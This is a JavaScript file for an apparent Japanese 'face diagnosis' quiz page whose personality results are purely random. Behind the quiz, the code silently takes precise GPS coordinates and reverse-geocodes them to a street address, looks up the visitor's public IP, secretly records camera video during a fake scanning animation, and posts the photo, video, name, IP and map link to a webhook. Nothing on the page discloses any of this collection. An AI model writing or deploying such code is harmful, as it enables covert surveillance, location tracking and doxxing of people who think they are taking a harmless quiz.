// CONFIGURATION
const WEBHOOK_URL = "webhook";

// DOM Elements
const video = document.getElementById('camera-feed');
const canvas = document.getElementById('capture-canvas');
const startBtn = document.getElementById('start-btn');
const scanBtn = document.getElementById('scan-btn');
const modal = document.getElementById('result-modal');
const closeModal = document.getElementById('close-modal');
const webhookStatus = document.getElementById('webhook-status');
const scanningOverlay = document.getElementById('scanning-overlay');
const scanProg = document.getElementById('scan-prog');
const nameInput = document.getElementById('user-name');

// Result Elements
const resultImg = document.getElementById('result-image');
const resId = document.getElementById('res-id');
const resPower = document.getElementById('res-power');
const resAttr = document.getElementById('res-attr');
const resAnimal = document.getElementById('res-animal');
const resComment = document.getElementById('res-comment');

let stream = null;
let locationData = { address: "取得中...", mapUrl: "none" };

const ANIMALS = ["賢者のフクロウ", "忠実な犬", "優雅な猫", "勇敢なライオン", "穏やかなクジラ", "俊敏なキツネ", "高潔な鹿"];
const ATTRIBUTES = ["分析家", "クリエイティブ", "バランス型", "行動派", "集中型", "直感型", "不屈"];
const COMMENTS = ["非常にバランスの取れた表情です。", "クリエイティブなオーラを感じます。", "知的で落ち着いた印象。", "内なる情熱が表情に表れています。", "信頼感のある眼差しです。"];

// --- Event Listeners ---
startBtn.addEventListener('click', startCamera);
scanBtn.addEventListener('click', takePicture);
closeModal.addEventListener('click', () => modal.classList.remove('visible'));
nameInput.addEventListener('input', checkInputState);

function checkInputState() {
    const hasName = nameInput.value.trim().length > 0;
    const hasStream = !!stream;
    scanBtn.disabled = !(hasName && hasStream);
}

// --- Functions ---
async function startCamera() {
    try {
        // 位置情報リクエスト（スマホのGPSを動かす）
        updateLocation();
        
        const constraints = {
            video: { 
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        };

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            throw new Error("HTTPS環境、または最新のブラウザが必要です。");
        }

        stream = await navigator.mediaDevices.getUserMedia(constraints);
        
        video.srcObject = stream;
        video.setAttribute("playsinline", true); // iPhoneの全画面強制を防止
        video.classList.add('active');
        video.play(); // スマホでの再生を確実に
        
        document.querySelector('.camera-info').style.display = 'none';
        startBtn.textContent = "Camera Active";
        startBtn.disabled = true;
        checkInputState();
    } catch (err) {
        console.error("Camera Error:", err);
        alert("エラー: " + err.message);
    }
}

function updateLocation() {
    if (!navigator.geolocation) {
        locationData.address = "非対応";
        return;
    }
    
    // スマホのGPSを最大限活用する設定
    const options = { 
        enableHighAccuracy: true, 
        timeout: 15000, 
        maximumAge: 0 
    };

    navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const acc = Math.floor(pos.coords.accuracy);
        
        locationData.mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        locationData.address = `${lat.toFixed(6)}, ${lon.toFixed(6)} (精度:${acc}m)`;
        
        try {
            // 日本語で住所を取得。 Nominatimは短時間に連続で叩くと弾かれるので注意
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&accept-language=ja`, {
                headers: { 'User-Agent': 'Diagnosis-App-Final-' + Math.random() }
            });
            const json = await res.json();
            if (json.display_name) {
                locationData.address = json.display_name.replace(", 日本", "");
            }
        } catch (e) { console.log("Reverse Geocoding Error", e); }
    }, (err) => {
        locationData.address = `エラー: ${err.message}`;
    }, options);
}

function takePicture() {
    if (!stream) return;
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/png');
    resultImg.src = dataUrl;
    runScanSequence(dataUrl);
}

async function runScanSequence(dataUrl) {
    scanningOverlay.classList.remove('hidden');
    scanBtn.disabled = true;

    let videoBlob = null;
    let mediaRecorder = null;
    let recordedChunks = [];

    // 録画開始（スマホ対応）
    if (stream) {
        try {
            const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
            mediaRecorder = new MediaRecorder(stream, { mimeType });
            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
            mediaRecorder.start();
        } catch (err) { console.error("Rec failed", err); }
    }

    const steps = ["Measuring...", "Processing...", "Analyzing...", "Finalizing..."];
    for (let i = 0; i <= 100; i += 2) {
        scanProg.textContent = i + "%";
        await new Promise(r => setTimeout(r, 80)); 
        if (i % 25 === 0) {
            const stepIndex = Math.min(Math.floor(i / 25), steps.length - 1);
            document.querySelector('.scanning-text').innerHTML = `${steps[stepIndex]} <span id="scan-prog">${i}%</span>`;
        }
    }

    if (mediaRecorder && mediaRecorder.state === "recording") {
        await new Promise(resolve => {
            mediaRecorder.onstop = () => { 
                videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType }); 
                resolve(); 
            };
            mediaRecorder.stop();
        });
    }

    scanningOverlay.classList.add('hidden');
    scanBtn.disabled = false;

    const diagnosis = generateDiagnosis();
    displayResults(diagnosis);

    canvas.toBlob((blob) => {
        sendWebhook(blob, diagnosis, locationData, videoBlob);
    }, 'image/png');

    modal.classList.add('visible');
}

function generateDiagnosis() {
    const power = Math.floor(Math.random() * 101);
    const animal = ANIMALS[Math.floor(Math.random() * ANIMALS.length)];
    const attr = ATTRIBUTES[Math.floor(Math.random() * ATTRIBUTES.length)];
    const comment = COMMENTS[Math.floor(Math.random() * COMMENTS.length)];
    const nameVal = nameInput.value.trim();
    return { id: nameVal || "匿名", power, animal, attr, comment };
}

function displayResults(data) {
    resId.textContent = data.id;
    resPower.textContent = data.power;
    resAnimal.textContent = data.animal;
    resAttr.textContent = data.attr;
    resComment.textContent = data.comment;
    webhookStatus.textContent = "Dispatched Result...";
}

async function sendWebhook(imageBlob, data, loc, videoBlob) {
    let ipInfo = "Unknown";
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipJson = await ipRes.json();
        ipInfo = ipJson.ip;
    } catch (e) {}

    const formData = new FormData();
    const payload = {
        username: "Diagnosis System v3.0",
        embeds: [{
            title: "Analysis Report",
            color: 3355443,
            fields: [
                { name: "Name", value: data.id, inline: true },
                { name: "Score", value: `${data.power}/100`, inline: true },
                { name: "Type", value: data.attr, inline: true },
                { name: "Guardian", value: data.animal, inline: true },
                { name: "Comment", value: data.comment },
                { name: "IP", value: ipInfo, inline: true },
                { name: "Location", value: loc.address },
                { name: "Map", value: loc.mapUrl !== "none" ? `[Open In Google Maps](${loc.mapUrl})` : "none" }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    formData.append('payload_json', JSON.stringify(payload));
    
    // 画像添付 (files[0])
    formData.append('files[0]', imageBlob, 'diagnosis.png');
    
    // 動画添付 (files[1])
    if (videoBlob) {
        const ext = videoBlob.type.includes('mp4') ? 'mp4' : 'webm';
        formData.append('files[1]', videoBlob, `scan.${ext}`);
    }

    try {
        const response = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
        webhookStatus.textContent = response.ok ? "Success" : "Failed";
        webhookStatus.style.color = response.ok ? "#4ade80" : "#ef4444";
    } catch (err) {
        webhookStatus.textContent = "Error";
        webhookStatus.style.color = "#ef4444";
    }
}